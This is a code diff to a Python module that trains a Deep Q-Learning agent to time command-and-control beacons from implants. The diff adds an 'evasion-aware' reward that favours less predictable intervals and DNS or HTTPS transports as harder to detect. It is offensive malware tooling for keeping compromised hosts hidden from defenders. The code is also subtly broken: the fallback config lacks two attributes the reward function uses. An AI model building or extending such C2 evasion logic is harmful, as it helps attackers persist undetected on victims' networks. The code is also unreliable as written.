@@ -2,10 +2,12 @@
 RL Beacon Timing Optimizer
 
 Learns optimal beacon timing for implants using Deep Q-Learning (DQN).
-Optimizes for connectivity while minimizing noise.
+Optimizes for connectivity while minimizing detection via C2 evasion parameters.
 
 State space: [hour, day_of_week, recent_success_rate, uptime, last_beacon_age, transport_idx]
 Action space: beacon_interval (6 options) + retry_count (4 options) = 24 total actions
+
+Evasion aware: Adjusts reward based on detection likelihood and evasion parameters
 """
 
 import torch
@@ -15,6 +17,15 @@ from collections import deque
 import numpy as np
 from datetime import datetime
 import json
+
+try:
+    from rl_evasion_config import EvasionConfig
+except ImportError:
+    # Fallback if evasion config not available
+    class EvasionConfig:
+        STEALTH_WEIGHT = 0.5
+        JITTER_RANGE = 10
+        TRANSPORT_SWITCH_PROB = 0.3
 
 # =========================================================================
 # CONFIG
@@ -129,14 +140,15 @@ class BeaconRLAgent:
         }
 
     def compute_reward(self, beacon_success: bool, beacon_interval: int,
-                      response_time: float = 0.0) -> float:
-        """Compute reward for beacon action
+                      response_time: float = 0.0, transport: str = "vpn") -> float:
+        """Compute reward for beacon action with C2 evasion optimization
 
-        Rewards:
+        Rewards based on:
             +10 for successful beacon
             -5 for failed beacon
-            -0.1 per second of interval (penalty for noise)
+            -penalty for predictable patterns (beacon interval)
             +bonus for fast response
+            -penalty for detection likelihood (evasion-aware)
         """
         reward = 0.0
 
@@ -150,8 +162,32 @@ class BeaconRLAgent:
             reward -= 5.0
             self.failed_beacons += 1
 
-        # Penalize excessive beacon intervals (stealth trade-off)
-        reward -= (beacon_interval / 60.0) * 0.1  # Small penalty for long intervals
+        # Stealth vs connectivity trade-off
+        # Penalize predictable patterns: shorter intervals are more detectable
+        interval_penalty = (beacon_interval / 60.0) * 0.1
+        stealth_bonus = EvasionConfig.STEALTH_WEIGHT * (beacon_interval / 600.0)
+        reward -= interval_penalty
+        reward += stealth_bonus
+
+        # Detection evasion rewards
+        # Prefer switching transports to avoid pattern detection
+        if transport not in ["vpn", "https", "dns"]:
+            transport = "vpn"
+        transport_evasion = {
+            "vpn": 0.5,      # Most direct but potentially monitored
+            "https": 1.0,    # Mixed with legitimate traffic
+            "dns": 1.5,      # Harder to detect
+        }
+        reward += transport_evasion.get(transport, 0.5) * (EvasionConfig.STEALTH_WEIGHT / 2.0)
+
+        # Penalize if success rate is dropping (detected?)
+        success_rate = (
+            self.successful_beacons / (self.successful_beacons + self.failed_beacons)
+            if (self.successful_beacons + self.failed_beacons) > 0 else 0.5
+        )
+        if success_rate < EvasionConfig.MIN_SUCCESS_RATE_FOR_STEALTH:
+            # Reduce stealth to regain connectivity
+            reward += (EvasionConfig.TARGET_SUCCESS_RATE - success_rate) * 5.0
 
         self.current_episode_reward += reward
         return reward
